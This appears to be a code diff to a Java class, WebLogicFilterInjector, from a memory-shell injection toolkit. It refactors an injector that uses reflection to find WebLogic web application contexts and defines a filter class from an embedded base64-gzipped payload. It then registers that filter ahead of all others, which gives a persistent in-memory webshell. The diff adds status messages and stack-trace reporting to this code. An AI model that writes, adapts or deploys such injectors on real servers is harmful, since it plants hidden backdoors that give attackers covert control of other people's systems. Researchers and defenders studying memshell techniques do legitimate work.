@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.injector.weblogic;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -13,6 +14,8 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  */
 public class WebLogicFilterInjector {
+
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -27,15 +30,42 @@ public class WebLogicFilterInjector {
     }
 
     public WebLogicFilterInjector() {
+        Set<Object> contexts = null;
         try {
-            Object[] contexts = getContext();
-            for (Object context : contexts) {
-                Object filter = getShell(context);
-                inject(context, filter);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
         }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public static Object[] getContextsByMbean() throws Throwable {
@@ -117,7 +147,7 @@ public class WebLogicFilterInjector {
      * /opt/oracle/wls1036/server/lib/weblogic.jar
      * /u01/oracle/wlserver/modules/com.oracle.weblogic.servlet.jar
      */
-    public static Object[] getContext() {
+    public static Set<Object> getContext() {
         Set<Object> webappContexts = new HashSet<Object>();
         try {
             webappContexts.addAll(Arrays.asList(getContextsByMbean()));
@@ -127,7 +157,7 @@ public class WebLogicFilterInjector {
             webappContexts.addAll(Arrays.asList(getContextsByThreads()));
         } catch (Throwable ignored) {
         }
-        return webappContexts.toArray();
+        return webappContexts;
     }
 
     public ClassLoader getWebAppClassLoader(Object context) throws Exception {
@@ -141,22 +171,26 @@ public class WebLogicFilterInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
-        if (isInjected(context)) {
-            System.out.println("filter already injected");
-            return;
+        Map filters = (Map) getFieldValue(getFieldValue(context, "filterManager"), "filters");
+        for (Object obj : filters.keySet()) {
+            if (obj.toString().contains(getClassName())) {
+                return;
+            }
         }
         Object filterManager = invokeMethod(context, "getFilterManager", null, null);
         Object servletClassLoader = invokeMethod(context, "getServletClassLoader", null, null);
@@ -166,18 +200,11 @@ public class WebLogicFilterInjector {
         List<Object> filterPatternList = (List<Object>) getFieldValue(filterManager, "filterPatternList");
         Object currentMapping = filterPatternList.remove(filterPatternList.size() - 1);
         filterPatternList.add(0, currentMapping);
-        System.out.println("filter inject successful");
     }
 
-    @SuppressWarnings("all")
-    public boolean isInjected(Object context) throws Exception {
-        Map filters = (Map) getFieldValue(getFieldValue(context, "filterManager"), "filters");
-        for (Object obj : filters.keySet()) {
-            if (obj.toString().contains(getClassName())) {
-                return true;
-            }
-        }
-        return false;
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -252,6 +279,21 @@ public class WebLogicFilterInjector {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
